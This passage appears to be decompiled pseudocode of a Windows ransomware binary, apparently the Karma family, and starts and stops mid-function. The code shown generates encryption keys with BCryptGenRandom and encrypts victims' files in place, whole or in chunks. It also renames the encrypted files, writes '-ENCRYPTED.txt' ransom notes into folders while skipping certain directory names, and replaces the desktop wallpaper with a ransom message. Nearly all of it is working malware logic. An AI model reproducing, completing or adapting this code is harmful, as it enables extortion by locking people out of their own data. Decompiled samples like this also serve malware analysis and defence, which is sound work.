  __int16 v4; // ax
  __int16 *v5; // ecx
  __int16 *v7; // ecx
  __int16 v8; // ax
  __int16 *v9; // eax
  const wchar_t *v10; // edx
  __int16 *v12; // eax
  wchar_t v13; // cx
  DWORD i; // eax
  HANDLE StdHandle; // eax
  DWORD v17; // [esp-8h] [ebp-214h]
  LPVOID v18; // [esp+0h] [ebp-20Ch] BYREF
  __int16 Buffer[260]; // [esp+4h] [ebp-208h] BYREF

  v2 = (_WORD *)&v18 + 1;
  v3 = ((a1 - (int)Buffer) >> 1) + 1;
  do
  {
    v4 = v2[v3];
    *++v2 = v4;
  }
  while ( v4 );
  if ( a2 )
  {
    v5 = Buffer;
    while ( *v5++ )
      ;
    v7 = v5 - 2;
    do
    {
      v8 = *a2;
      *++v7 = *a2++;
    }
    while ( v8 );
  }
  v9 = Buffer;
  v10 = L"\n";
  while ( *v9++ )
    ;
  v12 = v9 - 2;
  do
  {
    v13 = *v10;
    *++v12 = *v10++;
  }
  while ( v13 );
  for ( i = 0; Buffer[i]; ++i )
    ;
  v18 = 0;
  v17 = i;
  StdHandle = GetStdHandle(0xFFFFFFF5);
  return WriteConsoleW(StdHandle, Buffer, v17, 0, v18);
}
// 404368: using guessed type wchar_t asc_404368[2];
// 4021B0: using guessed type __int16 Buffer[260];

//----- (00402280) --------------------------------------------------------
_BYTE *sub_402280()
{
  int v0; // eax
  HANDLE ProcessHeap; // eax
  _BYTE *v2; // esi
  int v3; // edx
  int v4; // eax
  int v5; // eax
  SIZE_T v7; // [esp-8h] [ebp-8h]

  v0 = 0;
  do
    ++v0;
  while ( word_405334[v0] );
  v7 = 4 * v0;
  ProcessHeap = GetProcessHeap();
  v2 = HeapAlloc(ProcessHeap, 0, v7);
  if ( sub_401D00(word_405334) > 0 )
  {
    do
    {
      v2[v3] = word_405334[v3];
      v4 = sub_401D00(word_405334);
    }
    while ( v3 < v4 );
  }
  v5 = 0;
  do
    ++v5;
  while ( word_405334[v5] );
  v2[v5] = 0;
  return v2;
}
// 4022D0: variable 'v3' is possibly undefined
// 405334: using guessed type __int16 word_405334[6];

//----- (00402320) --------------------------------------------------------
HANDLE sub_402320()
{
  WCHAR *v0; // ecx
  const wchar_t *v1; // edx
  WCHAR *v3; // ecx
  wchar_t v4; // ax
  HANDLE ProcessHeap; // eax
  _WORD *v6; // edi
  _WORD *v7; // edx
  __int16 v8; // ax
  HDC CompatibleDC; // esi
  int v10; // ecx
  int v11; // esi
  int v12; // eax
  HDC v13; // edi
  HBITMAP v14; // eax
  int v15; // esi
  int v16; // edx
  int v17; // ecx
  int v18; // esi
  HANDLE result; // eax
  void *v20; // edi
  HANDLE v21; // eax
  void *v22; // [esp-4h] [ebp-2D4h]
  int SystemMetrics; // [esp+8h] [ebp-2C8h]
  int v24; // [esp+8h] [ebp-2C8h]
  HDC hdc; // [esp+Ch] [ebp-2C4h]
  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-2C0h] BYREF
  HDC v27; // [esp+14h] [ebp-2BCh]
  HDC hDC; // [esp+18h] [ebp-2B8h]
  HGDIOBJ h; // [esp+1Ch] [ebp-2B4h]
  int cy[4]; // [esp+20h] [ebp-2B0h] BYREF
  DWORD nNumberOfBytesToWrite[4]; // [esp+30h] [ebp-2A0h]
  __int64 v32; // [esp+40h] [ebp-290h]
  int x; // [esp+5Ch] [ebp-274h]
  void *ppvBits; // [esp+60h] [ebp-270h] BYREF
  HGDIOBJ ho; // [esp+64h] [ebp-26Ch]
  LPVOID lpMem; // [esp+68h] [ebp-268h]
  __int16 v37; // [esp+6Ch] [ebp-264h] BYREF
  int v38; // [esp+6Eh] [ebp-262h]
  int v39; // [esp+72h] [ebp-25Eh]
  int v40; // [esp+76h] [ebp-25Ah]
  struct tagSIZE psizl; // [esp+7Ch] [ebp-254h] BYREF
  struct tagRECT rc; // [esp+84h] [ebp-24Ch] BYREF
  BITMAPINFO pbmi; // [esp+94h] [ebp-23Ch] BYREF
  WCHAR Buffer[264]; // [esp+C0h] [ebp-210h] BYREF

  GetTempPathW(0x104u, Buffer);
  v0 = Buffer;
  v1 = L"background.jpg";
  while ( *v0++ )
    ;
  v3 = v0 - 2;
  do
  {
    v4 = *v1;
    *++v3 = *v1++;
  }
  while ( v4 );
  ProcessHeap = GetProcessHeap();
  v6 = HeapAlloc(ProcessHeap, 8u, 0x800u);
  lpMem = v6;
  v7 = v6 - 1;
  do
  {
    v8 = v7[L"\n\nPLEASE, READ KARMA-ENCRYPTED" - v6 + 1];
    *++v7 = v8;
  }
  while ( v8 );
  h = CreateFontW(45, 0, 0, 0, 400, 0, 0, 0, 1u, 2u, 0, 0, 0, L"Leelawadee");
  hDC = GetDC(0);
  CompatibleDC = CreateCompatibleDC(hDC);
  hdc = CompatibleDC;
  SelectObject(CompatibleDC, h);
  v10 = 0;
  if ( *v6 )
  {
    do
      ++v10;
    while ( v6[v10] );
  }
  GetTextExtentPoint32W(CompatibleDC, v6, v10, &psizl);
  psizl.cx = (psizl.cx + 3) & 0xFFFFFFFC;
  SystemMetrics = GetSystemMetrics(0);
  v11 = GetSystemMetrics(1);
  ho = CreateCompatibleBitmap(hdc, SystemMetrics, v11);
  SelectObject(hdc, ho);
  SetTextColor(hdc, 0xFFFFFFu);
  SetBkMode(hdc, 2);
  SetBkColor(hdc, 0);
  rc.right = SystemMetrics;
  v12 = 0;
  rc.top = 0;
  rc.left = 0;
  rc.bottom = v11;
  if ( *v6 )
  {
    do
      ++v12;
    while ( v6[v12] );
  }
  DrawTextW(hdc, v6, v12, &rc, 0x211u);
  cy[2] = v11;
  v37 = 19778;
  v39 = 0;
  cy[0] = 40;
  cy[1] = SystemMetrics;
  cy[3] = 1048577;
  nNumberOfBytesToWrite[0] = 0;
  nNumberOfBytesToWrite[1] = 2 * SystemMetrics * v11;
  *(_OWORD *)&pbmi.bmiHeader.biSize = *(_OWORD *)cy;
  nNumberOfBytesToWrite[2] = 0;
  nNumberOfBytesToWrite[3] = 0;
  v32 = 0i64;
  *(_OWORD *)&pbmi.bmiHeader.biCompression = *(unsigned __int64 *)nNumberOfBytesToWrite;
  v38 = 0;
  v40 = 54;
  *(_QWORD *)&pbmi.bmiHeader.biClrUsed = 0i64;
  v13 = CreateCompatibleDC(hDC);
  v27 = v13;
  v14 = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0, 0);
  SelectObject(v13, v14);
  BitBlt(v13, 0, 0, SystemMetrics, v11, hdc, 0, 0, 0xCC0020u);
  v15 = SystemMetrics;
  if ( SystemMetrics > 0 )
  {
    v16 = cy[2];
    v17 = -3;
    v24 = -3;
    do
    {
      if ( v16 > 0 )
      {
        v18 = 3;
        do
        {
          x = v17 + 3;
          if ( !GetPixel(v13, v17 + 3, v18 - 3) )
          {
            SetPixel(v13, x, v18 - 3, 0xC3C3C3u);
            SetPixel(v13, v24 + 6, v18, 0xC3C3C3u);
            SetPixel(v27, v24, v18 - 6, 0xC3C3C3u);
            v13 = v27;
            SetPixel(v27, v24 + 6, v18 - 6, 0xC3C3C3u);
            SetPixel(v27, v24, v18, 0xC3C3C3u);
          }
          v16 = cy[2];
          v18 += 12;
          v17 = v24;
        }
        while ( v18 - 3 < cy[2] );
        v15 = cy[1];
      }
      v17 += 12;
      v24 = v17;
    }
    while ( v17 + 3 < v15 );
  }
  ReleaseDC(0, hDC);
  result = CreateFileW(Buffer, 0x40000000u, 0, 0, 4u, 0x80u, 0);
  v20 = result;
  if ( result != (HANDLE)-1 )
  {
    NumberOfBytesWritten = 0;
    WriteFile(result, &v37, 0xEu, &NumberOfBytesWritten, 0);
    WriteFile(v20, cy, 0x28u, &NumberOfBytesWritten, 0);
    WriteFile(v20, ppvBits, nNumberOfBytesToWrite[1], &NumberOfBytesWritten, 0);
    CloseHandle(v20);
    DeleteObject(ho);
    DeleteDC(hdc);
    DeleteObject(h);
    v22 = lpMem;
    v21 = GetProcessHeap();
    HeapFree(v21, 0, v22);
    return (HANDLE)SystemParametersInfoW(0x14u, 0, Buffer, 1u);
  }
  return result;
}
// 404374: using guessed type wchar_t aBackgroundJpg[15];
// 404394: using guessed type wchar_t aPleaseReadKarm[31];

//----- (00402760) --------------------------------------------------------
HANDLE __thiscall sub_402760(LPCWSTR lpFileName)
{
  HANDLE result; // eax
  HANDLE v2; // edi
  SIZE_T v3; // ecx
  HANDLE ProcessHeap; // eax
  HANDLE v5; // eax
  HANDLE v6; // eax
  HANDLE v7; // eax
  __m128i *v8; // ebx
  HANDLE v9; // eax
  UCHAR *v10; // eax
  HMODULE LibraryW; // ecx
  UCHAR *v12; // esi
  NTSTATUS (__stdcall *BCryptGenRandom)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG); // eax
  UCHAR *v14; // ecx
  int v15; // eax
  int v16; // edx
  unsigned int v17; // ecx
  int v18; // eax
  char *v19; // ecx
  int v20; // edx
  unsigned int v21; // ecx
  char *v22; // edx
  int i; // edi
  char v24; // cl
  char *v25; // esi
  int v26; // esi
  unsigned int v27; // edx
  unsigned int v28; // ecx
  _BYTE *v29; // ebx
  unsigned int v30; // edx
  unsigned int v31; // ecx
  _BYTE *v32; // esi
  DWORD v33; // eax
  LONG HighPart; // ecx
  DWORD LowPart; // eax
  LONG v36; // edx
  DWORD v37; // edi
  unsigned __int64 v38; // kr08_8
  HANDLE v39; // eax
  void *v40; // esi
  int v41; // ecx
  HANDLE v42; // eax
  HANDLE v43; // eax
  HANDLE v44; // eax
  HANDLE v45; // eax
  HANDLE v46; // eax
  HANDLE v47; // eax
  const WCHAR *v48; // esi
  _WORD *v49; // ecx
  int v50; // edx
  __int16 v51; // ax
  WCHAR *v52; // ecx
  __int16 *v53; // edx
  WCHAR *v55; // ecx
  __int16 v56; // ax
  WCHAR *v57; // ecx
  __int16 *v58; // edx
  WCHAR *v60; // ecx
  __int16 v61; // ax
  HANDLE v62; // eax
  void *v63; // ebx
  int v64; // ecx
  HANDLE v65; // eax
  SIZE_T v66; // [esp-4h] [ebp-254h]
  void *v67; // [esp-4h] [ebp-254h]
  void *v68; // [esp-4h] [ebp-254h]
  void *v69; // [esp-4h] [ebp-254h]
  void *v70; // [esp-4h] [ebp-254h]
  DWORD v71; // [esp-4h] [ebp-254h]
  HANDLE hFile; // [esp+10h] [ebp-240h]
  __m128i *v73; // [esp+14h] [ebp-23Ch]
  LONG v74; // [esp+14h] [ebp-23Ch]
  LARGE_INTEGER FileSize; // [esp+18h] [ebp-238h] BYREF
  LPVOID lpMem; // [esp+24h] [ebp-22Ch]
  LPVOID v77[2]; // [esp+28h] [ebp-228h]
  DWORD NumberOfBytesWritten; // [esp+30h] [ebp-220h] BYREF
  LPCVOID lpBuffer; // [esp+34h] [ebp-21Ch]
  LARGE_INTEGER liDistanceToMove; // [esp+38h] [ebp-218h]
  DWORD NumberOfBytesRead; // [esp+40h] [ebp-210h] BYREF
  LPCWSTR lpExistingFileName; // [esp+44h] [ebp-20Ch] BYREF
  WCHAR NewFileName[260]; // [esp+48h] [ebp-208h] BYREF

  NumberOfBytesRead = 0;
  lpExistingFileName = lpFileName;
  result = CreateFileW(lpFileName, 0xC0000000, 0, 0, 3u, 0, 0);
  v2 = result;
  hFile = result;
  if ( result )
  {
    GetFileSizeEx(result, &FileSize);
    v3 = 0;
    if ( *(_BYTE *)dword_406000 )
    {
      do
        ++v3;
      while ( *(_BYTE *)(dword_406000 + v3) );
    }
    v66 = v3;
    ProcessHeap = GetProcessHeap();
    lpBuffer = HeapAlloc(ProcessHeap, 0, v66);
    v5 = GetProcessHeap();
    lpMem = HeapAlloc(v5, 0, 8u);
    v6 = GetProcessHeap();
    v77[0] = HeapAlloc(v6, 0, 0x40u);
    v7 = GetProcessHeap();
    v8 = (__m128i *)HeapAlloc(v7, 0, 0x40u);
    v73 = v8;
    v9 = GetProcessHeap();
    v10 = (UCHAR *)HeapAlloc(v9, 0, 0x20u);
    LibraryW = dword_406014;
    v12 = v10;
    v77[1] = v10;
    if ( !dword_406014 )
    {
      LibraryW = LoadLibraryW(L"bcrypt.dll");
      dword_406014 = LibraryW;
    }
    BCryptGenRandom = (NTSTATUS (__stdcall *)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG))dword_40600C;
    if ( !dword_40600C )
    {
      BCryptGenRandom = (NTSTATUS (__stdcall *)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG))GetProcAddress(
                                                                                           LibraryW,
                                                                                           "BCryptGenRandom");
      dword_40600C = (int)BCryptGenRandom;
    }
    BCryptGenRandom(0, v12, 32, 2);
    v8->m128i_i32[0] = 1912427915;
    v14 = v12 + 32;
    v8->m128i_i32[1] = -117904525;
    v15 = 256;
    v8->m128i_i32[2] = 958368566;
    v8->m128i_i32[3] = 1609524668;
    v8[1].m128i_i32[0] = 972143477;
    v8[1].m128i_i32[1] = -2095858911;
    v8[1].m128i_i32[2] = -908080212;
    v8[1].m128i_i32[3] = 250;
    v8[2].m128i_i32[0] = 33034322;
    v8[2].m128i_i32[1] = 913403774;
    v8[2].m128i_i32[2] = -127424566;
    v8[2].m128i_i32[3] = -1081472017;
    v8[3].m128i_i32[0] = -444258114;
    v8[3].m128i_i32[1] = 53806712;
    v8[3].m128i_i32[2] = 1778951193;
    v8[3].m128i_i32[3] = 256;
    while ( 1 )
    {
      v16 = *((_DWORD *)v14 - 1);
      v14 -= 4;
      if ( v16 )
        break;
      v15 -= 32;
      if ( v15 <= 0 )
      {
        if ( !v15 )
          goto LABEL_24;
        break;
      }
    }
    v17 = 0x80000000;
    if ( v16 >= 0 )
    {
      do
      {
        v17 >>= 1;
        --v15;
      }
      while ( (v16 & v17) == 0 );
    }
    if ( v15 >= 116 )
    {
      v18 = 256;
      v19 = (char *)&unk_404150;
      while ( 1 )
      {
        v20 = *((_DWORD *)v19 - 1);
        v19 -= 4;
        if ( v20 )
          break;
        v18 -= 32;
        if ( v18 <= 0 )
        {
          if ( !v18 )
            goto LABEL_21;
          break;
        }
      }
      v21 = 0x80000000;
      if ( v20 >= 0 )
      {
        do
        {
          v21 >>= 1;
          --v18;
        }
        while ( (v20 & v21) == 0 );
      }
LABEL_21:
      v22 = (char *)v77[1];
      for ( i = v18 - 1; i < 256; *(_DWORD *)v25 &= ~(1 << v24) )
      {
        v24 = i & 0x1F;
        v25 = &v22[4 * ((unsigned int)i++ >> 5)];
      }
      sub_4018C0(v8->m128i_i32, v8 + 2, (int)v22);
      v2 = hFile;
    }
LABEL_24:
    sub_4019E0((unsigned int)v77[0]);
    v26 = dword_406000;
    v27 = 0;
    if ( *(_BYTE *)dword_406000 )
    {
      do
        ++v27;
      while ( *(_BYTE *)(dword_406000 + v27) );
    }
    v28 = 0;
    if ( v27 )
    {
      v29 = lpBuffer;
      do
      {
        v29[v28] = *(_BYTE *)(v28 + v26);
        ++v28;
      }
      while ( v28 < v27 );
      v8 = v73;
    }
    v30 = 0;
    do
      ++v30;
    while ( byte_4043EC[v30] );
    v31 = 0;
    if ( v30 )
    {
      v32 = lpMem;
      do
      {
        v32[v31] = byte_4043EC[v31];
        ++v31;
      }
      while ( v31 < v30 );
    }
    SetFilePointerEx(v2, FileSize, 0, 0);
    SetLastError(0);
    WriteFile(v2, v8, 0x40u, &NumberOfBytesWritten, 0);
    if ( GetLastError() != 6 && GetLastError() != 19 )
    {
      SetFilePointerEx(v2, (LARGE_INTEGER)(FileSize.QuadPart + 64), 0, 0);
      v33 = 0;
      if ( *(_BYTE *)dword_406000 )
      {
        do
          ++v33;
        while ( *(_BYTE *)(v33 + dword_406000) );
      }
      WriteFile(v2, lpBuffer, v33, &NumberOfBytesWritten, 0);
      HighPart = FileSize.HighPart;
      LowPart = FileSize.LowPart;
      if ( FileSize.QuadPart <= 1200000 )
      {
        v71 = FileSize.LowPart;
        v62 = GetProcessHeap();
        v63 = HeapAlloc(v62, 0, v71);
        liDistanceToMove.QuadPart = 0i64;
        SetFilePointerEx(hFile, 0i64, 0, 0);
        ReadFile(hFile, v63, FileSize.LowPart, &NumberOfBytesRead, 0);
        sub_403A60((int *)lpMem, v64, (int)v63, FileSize.LowPart);
        v2 = hFile;
        SetFilePointerEx(hFile, 0i64, 0, 0);
        WriteFile(hFile, v63, FileSize.LowPart, &NumberOfBytesWritten, 0);
        v65 = GetProcessHeap();
        HeapFree(v65, 0, v63);
        v8 = v73;
      }
      else
      {
        liDistanceToMove.QuadPart = 0i64;
        v36 = 0;
        v74 = 0;
        v37 = 0;
        while ( 1 )
        {
          v38 = __PAIR64__(HighPart, LowPart) - __PAIR64__(v36, v37);
          liDistanceToMove.HighPart = (__PAIR64__(HighPart, LowPart) - __PAIR64__(v36, v37)) >> 32;
          if ( liDistanceToMove.HighPart < 0
            || (__SPAIR64__(HighPart, LowPart) < __SPAIR64__(v36, v37) || HIDWORD(v38) == 0)
            && (unsigned int)v38 < 0x27100 )
          {
            break;
          }
          v39 = GetProcessHeap();
          v40 = HeapAlloc(v39, 0, 0x27100u);
          SetFilePointerEx(hFile, (LARGE_INTEGER)__PAIR64__(v74, v37), 0, 0);
          ReadFile(hFile, v40, 0x27100u, &NumberOfBytesRead, 0);
          sub_403A60((int *)lpMem, v41, (int)v40, 0x27100u);
          SetFilePointerEx(hFile, (LARGE_INTEGER)__PAIR64__(v74, v37), 0, 0);
          WriteFile(hFile, v40, 0x27100u, &NumberOfBytesWritten, 0);
          v42 = GetProcessHeap();
          HeapFree(v42, 0, v40);
          HighPart = FileSize.HighPart;
          v36 = (__PAIR64__(v74, v37) + 320000) >> 32;
          v37 += 320000;
          v74 = v36;
          if ( v36 >= FileSize.HighPart )
          {
            if ( v36 > FileSize.HighPart )
              break;
            LowPart = FileSize.LowPart;
            if ( v37 >= FileSize.LowPart )
              break;
          }
          else
          {
            LowPart = FileSize.LowPart;
          }
        }
        v2 = hFile;
      }
    }
    v67 = (void *)lpBuffer;
    v43 = GetProcessHeap();
    HeapFree(v43, 0, v67);
    v68 = lpMem;
    v44 = GetProcessHeap();
    HeapFree(v44, 0, v68);
    v69 = v77[0];
    v45 = GetProcessHeap();
    HeapFree(v45, 0, v69);
    v46 = GetProcessHeap();
    HeapFree(v46, 0, v8);
    v70 = v77[1];
    v47 = GetProcessHeap();
    HeapFree(v47, 0, v70);
    CloseHandle(v2);
    v48 = lpExistingFileName;
    v49 = (_WORD *)&lpExistingFileName + 1;
    v50 = lpExistingFileName - NewFileName + 1;
    do
    {
      v51 = v49[v50];
      *++v49 = v51;
    }
    while ( v51 );
    v52 = NewFileName;
    v53 = &word_4043F8;
    while ( *v52++ )
      ;
    v55 = v52 - 2;
    do
    {
      v56 = *v53;
      *++v55 = *v53++;
    }
    while ( v56 );
    v57 = NewFileName;
    v58 = word_405334;
    while ( *v57++ )
      ;
    v60 = v57 - 2;
    do
    {
      v61 = *v58;
      *++v60 = *v58++;
    }
    while ( v61 );
    return (HANDLE)MoveFileW(v48, NewFileName);
  }
  return result;
}
// 402A92: conditional instruction was optimized away because %FileSize@4.4>=0
// 402A9C: conditional instruction was optimized away because %FileSize.4>=124F81u
// 402B1A: variable 'v41' is possibly undefined
// 402CEB: variable 'v64' is possibly undefined
// 4043F8: using guessed type __int16 word_4043F8;
// 405334: using guessed type __int16 word_405334[6];
// 406000: using guessed type int dword_406000;
// 40600C: using guessed type int dword_40600C;

//----- (00402D30) --------------------------------------------------------
HANDLE __thiscall sub_402D30(_BYTE *this)
{
  _BYTE *v1; // edi
  __int16 *v2; // edx
  int v3; // ecx
  __int16 v4; // ax
  WCHAR *v5; // ecx
  const wchar_t *v6; // edx
  WCHAR *v8; // ecx
  wchar_t v9; // ax
  WCHAR *v10; // ecx
  WCHAR v11; // ax
  WCHAR *v12; // ecx
  __int16 *v13; // edx
  WCHAR *v15; // ecx
  __int16 v16; // ax
  WCHAR *v17; // ecx
  const wchar_t *v18; // edx
  WCHAR *v20; // ecx
  wchar_t v21; // ax
  HANDLE FileW; // esi
  DWORD v23; // ecx
  HANDLE result; // eax
  int i; // edi
  int v26; // ecx
  int v27; // esi
  int v28; // edx
  int v29; // ecx
  int j; // edi
  int v31; // ecx
  int v32; // esi
  int v33; // edx
  int v34; // ecx
  int k; // edi
  int v36; // ecx
  int v37; // esi
  int v38; // edx
  int v39; // ecx
  int m; // edi
  int v41; // ecx
  int v42; // esi
  int v43; // edx
  int v44; // ecx
  int n; // edi
  int v46; // ecx
  int v47; // esi
  int v48; // edx
  int v49; // ecx
  int ii; // edi
  int v51; // ecx
  int v52; // esi
  int v53; // edx
  int v54; // ecx
  int jj; // edi
  int v56; // ecx
  int v57; // esi
  int v58; // edx
  int v59; // ecx
  int kk; // edi
  int v61; // ecx
  int v62; // esi
  int v63; // edx
  int v64; // ecx
  int mm; // edi
  int v66; // ecx
  int v67; // esi
  int v68; // edx
  int v69; // ecx
  int nn; // edi
  int v71; // ecx
  int v72; // esi
  int v73; // edx
  int v74; // ecx
  int i1; // edi
  int v76; // ecx
  int v77; // esi
  int v78; // edx
  int v79; // ecx
  int i2; // edi
  int v81; // ecx
  int v82; // esi
  int v83; // edx
  int v84; // ecx
  int i3; // edi
  int v86; // ecx
  int v87; // esi
  int v88; // edx
  int v89; // ecx
  int i4; // edi
  int v91; // ecx
  int v92; // esi
  int v93; // edx
  int v94; // ecx
  WCHAR *v95; // ecx
  WCHAR v96; // ax
  WCHAR *v97; // ecx
  WCHAR *cFileName; // edx
  WCHAR *v100; // ecx
  WCHAR v101; // ax
  WCHAR *v102; // ecx
  const wchar_t *v103; // edx
  WCHAR *v105; // ecx
  wchar_t v106; // ax
  __int16 *v107; // ecx
  __int16 v108; // ax
  WCHAR *v109; // ecx
  WCHAR *v110; // edx
  WCHAR *v112; // ecx
  WCHAR v113; // ax
  WCHAR *v114; // ecx
  WCHAR *v115; // esi
  WCHAR v116; // dx
  WCHAR v117; // ax
  WCHAR *v118; // edx
  int v119; // ecx
  WCHAR v120; // ax
  int i5; // edi
  int v122; // ecx
  int v123; // esi
  int v124; // edx
  int v125; // ecx
  int i6; // edi
  int v127; // ecx
  int v128; // esi
  int v129; // edx
  int v130; // ecx
  int i7; // edi
  int v132; // ecx
  int v133; // esi
  int v134; // edx
  int v135; // ecx
  int i8; // edi
  int v137; // ecx
  int v138; // esi
  int v139; // edx
  int v140; // ecx
  int i9; // edi
  int v142; // ecx
  int v143; // esi
  int v144; // edx
  int v145; // ecx
  WCHAR *v146; // edi
  int v147; // esi
  __int16 *v148; // eax
  int v149; // ecx
  WCHAR v150; // cx
  void *v151; // ebx
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-86Ch] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-868h] BYREF
  WCHAR FileName[259]; // [esp+268h] [ebp-618h] BYREF
  __int16 v156; // [esp+46Eh] [ebp-412h] BYREF
  WCHAR v157[259]; // [esp+470h] [ebp-410h] BYREF
  __int16 v158; // [esp+676h] [ebp-20Ah] BYREF
  WCHAR v159[260]; // [esp+678h] [ebp-208h] BYREF

  v1 = this;
  v2 = &v158;
  v3 = ((this - (_BYTE *)v159) >> 1) + 1;
  do
  {
    v4 = v2[v3];
    *++v2 = v4;
  }
  while ( v4 );
  v5 = v159;
  v6 = L"*.*";
  while ( *v5++ )
    ;
  v8 = v5 - 2;
  do
  {
    v9 = *v6;
    *++v8 = *v6++;
  }
  while ( v9 );
  v10 = &FindFileData.cAlternateFileName[13];
  do
  {
    v11 = v10[((v1 - (_BYTE *)FileName) >> 1) + 1];
    *++v10 = v11;
  }
  while ( v11 );
  v12 = FileName;
  v13 = word_405334;
  while ( *v12++ )
    ;
  v15 = v12 - 2;
  do
  {
    v16 = *v13;
    *++v15 = *v13++;
  }
  while ( v16 );
  v17 = FileName;
  v18 = L"-ENCRYPTED.txt";
  while ( *v17++ )
    ;
  v20 = v17 - 2;
  do
  {
    v21 = *v18;
    *++v20 = *v18++;
  }
  while ( v21 );
  FileW = CreateFileW(FileName, 0xC0000000, 0, 0, 2u, 0, 0);
  if ( FileW )
  {
    v23 = 0;
    NumberOfBytesWritten = 0;
    if ( *(_BYTE *)lpBuffer )
    {
      do
        ++v23;
      while ( *((_BYTE *)lpBuffer + v23) );
    }
    WriteFile(FileW, lpBuffer, v23, &NumberOfBytesWritten, 0);
    CloseHandle(FileW);
  }
  result = FindFirstFileW(v159, &FindFileData);
  NumberOfBytesWritten = (DWORD)result;
  if ( result != (HANDLE)-1 )
  {
    do
    {
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        for ( i = 0; ; ++i )
        {
          v26 = (unsigned __int16)word_4043F8[i];
          v27 = FindFileData.cFileName[i];
          v28 = v26 + 32;
          if ( (unsigned int)(v26 - 65) > 0x19 )
            v28 = (unsigned __int16)word_4043F8[i];
          v29 = v27 + 32;
          if ( (unsigned int)(v27 - 65) > 0x19 )
            v29 = FindFileData.cFileName[i];
          if ( v29 != v28 )
            break;
          if ( !FindFileData.cFileName[i] )
            goto LABEL_213;
        }
        for ( j = 0; ; ++j )
        {
          v31 = (unsigned __int16)word_404404[j];
          v32 = FindFileData.cFileName[j];
          v33 = v31 + 32;
          if ( (unsigned int)(v31 - 65) > 0x19 )
            v33 = (unsigned __int16)word_404404[j];
          v34 = v32 + 32;
          if ( (unsigned int)(v32 - 65) > 0x19 )
            v34 = FindFileData.cFileName[j];
          if ( v34 != v33 )
            break;
          if ( !FindFileData.cFileName[j] )
            goto LABEL_213;
        }
        for ( k = 0; ; ++k )
        {
          v36 = (unsigned __int16)word_40440C[k];
          v37 = FindFileData.cFileName[k];
          v38 = v36 + 32;
          if ( (unsigned int)(v36 - 65) > 0x19 )
            v38 = (unsigned __int16)word_40440C[k];
          v39 = v37 + 32;
          if ( (unsigned int)(v37 - 65) > 0x19 )
            v39 = FindFileData.cFileName[k];
          if ( v39 != v38 )
            break;
          if ( !FindFileData.cFileName[k] )
            goto LABEL_213;
        }
        for ( m = 0; ; ++m )
        {
          v41 = (unsigned __int16)word_40441C[m];
          v42 = FindFileData.cFileName[m];
          v43 = v41 + 32;
          if ( (unsigned int)(v41 - 65) > 0x19 )
            v43 = (unsigned __int16)word_40441C[m];
          v44 = v42 + 32;
          if ( (unsigned int)(v42 - 65) > 0x19 )
            v44 = FindFileData.cFileName[m];
          if ( v44 != v43 )
            break;
          if ( !FindFileData.cFileName[m] )
            goto LABEL_213;
        }
        for ( n = 0; ; ++n )
        {
          v46 = (unsigned __int16)word_404438[n];
          v47 = FindFileData.cFileName[n];
          v48 = v46 + 32;
          if ( (unsigned int)(v46 - 65) > 0x19 )
            v48 = (unsigned __int16)word_404438[n];
          v49 = v47 + 32;
          if ( (unsigned int)(v47 - 65) > 0x19 )
            v49 = FindFileData.cFileName[n];
          if ( v49 != v48 )
            break;
          if ( !FindFileData.cFileName[n] )
            goto LABEL_213;
        }
        for ( ii = 0; ; ++ii )
        {
          v51 = (unsigned __int16)word_40444C[ii];
          v52 = FindFileData.cFileName[ii];
          v53 = v51 + 32;
          if ( (unsigned int)(v51 - 65) > 0x19 )
            v53 = (unsigned __int16)word_40444C[ii];
          v54 = v52 + 32;
          if ( (unsigned int)(v52 - 65) > 0x19 )
            v54 = FindFileData.cFileName[ii];
          if ( v54 != v53 )
            break;
          if ( !FindFileData.cFileName[ii] )
            goto LABEL_213;
        }
        for ( jj = 0; ; ++jj )
        {
          v56 = (unsigned __int16)word_404468[jj];
          v57 = FindFileData.cFileName[jj];
          v58 = v56 + 32;
          if ( (unsigned int)(v56 - 65) > 0x19 )
            v58 = (unsigned __int16)word_404468[jj];
          v59 = v57 + 32;
          if ( (unsigned int)(v57 - 65) > 0x19 )
            v59 = FindFileData.cFileName[jj];
          if ( v59 != v58 )
            break;
          if ( !FindFileData.cFileName[jj] )
            goto LABEL_213;
        }
        for ( kk = 0; ; ++kk )
        {
          v61 = (unsigned __int16)word_404478[kk];
          v62 = FindFileData.cFileName[kk];
          v63 = v61 + 32;
          if ( (unsigned int)(v61 - 65) > 0x19 )
            v63 = (unsigned __int16)word_404478[kk];
          v64 = v62 + 32;
          if ( (unsigned int)(v62 - 65) > 0x19 )
            v64 = FindFileData.cFileName[kk];
          if ( v64 != v63 )
            break;
          if ( !FindFileData.cFileName[kk] )
            goto LABEL_213;
        }
        for ( mm = 0; ; ++mm )
        {
          v66 = (unsigned __int16)word_404490[mm];
          v67 = FindFileData.cFileName[mm];
          v68 = v66 + 32;
          if ( (unsigned int)(v66 - 65) > 0x19 )
            v68 = (unsigned __int16)word_404490[mm];
          v69 = v67 + 32;
          if ( (unsigned int)(v67 - 65) > 0x19 )
            v69 = FindFileData.cFileName[mm];
          if ( v69 != v68 )
            break;
          if ( !FindFileData.cFileName[mm] )
            goto LABEL_213;
        }
        for ( nn = 0; ; ++nn )
        {
          v71 = (unsigned __int16)word_4044A0[nn];
          v72 = FindFileData.cFileName[nn];
          v73 = v71 + 32;
          if ( (unsigned int)(v71 - 65) > 0x19 )
            v73 = (unsigned __int16)word_4044A0[nn];
          v74 = v72 + 32;
          if ( (unsigned int)(v72 - 65) > 0x19 )
            v74 = FindFileData.cFileName[nn];
          if ( v74 != v73 )
            break;
          if ( !FindFileData.cFileName[nn] )
            goto LABEL_213;
        }
        for ( i1 = 0; ; ++i1 )
        {
          v76 = (unsigned __int16)word_4044BC[i1];
          v77 = FindFileData.cFileName[i1];
          v78 = v76 + 32;
          if ( (unsigned int)(v76 - 65) > 0x19 )
            v78 = (unsigned __int16)word_4044BC[i1];
          v79 = v77 + 32;
          if ( (unsigned int)(v77 - 65) > 0x19 )
            v79 = FindFileData.cFileName[i1];
          if ( v79 != v78 )
            break;
          if ( !FindFileData.cFileName[i1] )
            goto LABEL_213;
        }
        for ( i2 = 0; ; ++i2 )
        {
